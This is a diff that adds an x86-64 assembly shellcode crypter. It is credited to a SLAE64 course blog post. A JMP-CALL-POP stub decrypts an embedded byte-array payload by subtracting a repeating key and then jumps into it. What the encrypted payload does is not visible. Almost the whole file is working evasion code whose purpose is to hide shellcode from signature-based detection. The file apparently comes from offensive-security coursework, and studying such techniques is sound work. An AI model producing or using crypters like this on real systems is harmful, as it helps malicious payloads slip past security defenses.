@@ -1,0 +1,38 @@
+; Author: Bobby Cooke
+; Blog: https://boku7.github.io/2020/04/27/SLAE64_7-cryptor.html
+xor rcx, rcx  ; rcx = 0x0
+mul rcx       ; rax&rdx = 0x0
+jmp short callEncrypted
+popEncrypted:
+pop rdi       ; rdi = &Encrypted
+jmp short callKey
+popKey:
+pop rax       ; rax = &key
+resetKey:
+push rax
+pop rsi       ; rsi = &key
+decryptLoop:
+mov dl, [rsi]
+sub [rdi], dl    ; decrypt byte of payload
+inc rsi          ; next key byte
+inc rdi          ; next encrypted byte
+mov dx, 0xbbaa
+cmp [rdi], dx    ; End of payload?
+je payload
+mov dl, 0xee
+cmp [rsi], dl    ; End of key?
+je resetKey
+jmp short decryptLoop ; use next byte of key to decrypt
+callEncrypted:
+call popEncrypted
+payload:
+db   0x9b,0xa0,0x49,0xad,0x5a,0x58,0x7b,0x85,0x52,\
+     0xc6,0x9b,0xe8,0x25,0xda,0x85,0x9c,0x0d,0x9e,\
+     0xb5,0xce,0xd1,0xa1,0x95,0xb5,0xc6,0xc1,0x9b,\
+     0x96,0x35,0xba,0xbc,0x3b,0x03,0xaa,0x62,0x6a,\
+     0xaa,0xbb
+callKey:
+call popKey
+key:
+db 0x53,0x6f,0x53,0x65,0x63,0x72,0x33,0x54,0xee
+
